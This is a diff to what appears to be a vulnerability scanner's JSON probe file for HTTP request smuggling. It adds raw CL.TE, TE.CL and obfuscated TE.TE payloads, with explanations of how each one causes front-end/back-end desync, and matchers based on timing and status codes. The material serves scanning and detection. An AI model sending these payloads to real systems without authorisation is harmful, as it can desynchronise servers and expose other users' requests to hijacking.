@@ -2,30 +2,73 @@
   "category": "request_smuggling",
   "contexts": {
     "cl_te": {
-      "description": "CL.TE request smuggling (Content-Length vs Transfer-Encoding)",
+      "description": "CL.TE request smuggling — front-end uses Content-Length, back-end uses Transfer-Encoding",
       "tech_match": ["Apache", "Nginx", "IIS"],
       "param_match": [],
       "probes": [
         {
-          "payload": "{{baseline}}",
-          "description": "CL.TE smuggling detection — send conflicting CL and TE headers",
-          "matchers": [{"type": "timing", "min_ms": 5000}],
-          "severity": "critical",
+          "payload": "POST / HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
+          "description": "CL.TE smuggling detection — front-end forwards 6 bytes (Content-Length), back-end parses chunked and sees 0-length chunk terminator, leaving 'G' as start of next request. Timeout indicates back-end is waiting for the smuggled request to complete.",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000},
+            {"type": "status", "status": [400, 403, 500]}
+          ],
+          "severity": "high",
           "confidence_boost": 50
         }
       ]
     },
     "te_cl": {
-      "description": "TE.CL request smuggling",
+      "description": "TE.CL request smuggling — front-end uses Transfer-Encoding, back-end uses Content-Length",
       "tech_match": ["Apache", "Nginx", "IIS"],
       "param_match": [],
       "probes": [
         {
-          "payload": "{{baseline}}",
-          "description": "TE.CL smuggling detection — reversed CL/TE priority",
-          "matchers": [{"type": "timing", "min_ms": 5000}],
-          "severity": "critical",
+          "payload": "POST / HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
+          "description": "TE.CL smuggling detection — front-end processes chunked encoding (chunk size 8 = 'SMUGGLED'), back-end reads only 3 bytes (Content-Length) and treats the rest as a new request. Timeout or status error indicates desync.",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000},
+            {"type": "status", "status": [400, 403, 500]}
+          ],
+          "severity": "high",
           "confidence_boost": 50
+        }
+      ]
+    },
+    "te_te": {
+      "description": "TE.TE request smuggling — both servers use Transfer-Encoding but one can be confused by obfuscated TE header variants",
+      "tech_match": ["Apache", "Nginx", "IIS"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 3\r\nTransfer-Encoding: xchunked\r\n\r\n0\r\n\r\n",
+          "description": "TE obfuscation via invalid value 'xchunked' — if front-end ignores malformed TE and falls back to Content-Length while back-end rejects and also falls back, differential parsing causes desync",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000},
+            {"type": "status", "status": [400, 403, 500]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 3\r\nTransfer-Encoding:\tchunked\r\n\r\n0\r\n\r\n",
+          "description": "TE obfuscation via tab before value — some servers reject TE headers with tab whitespace and fall back to Content-Length, creating parsing differential",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000},
+            {"type": "status", "status": [400, 403, 500]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: x\r\n\r\n0\r\n\r\n",
+          "description": "TE obfuscation via duplicate header with different case — one server uses first TE (chunked), the other uses second (invalid 'x') and falls back to Content-Length, causing desync",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000},
+            {"type": "status", "status": [400, 403, 500]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
         }
       ]
     }
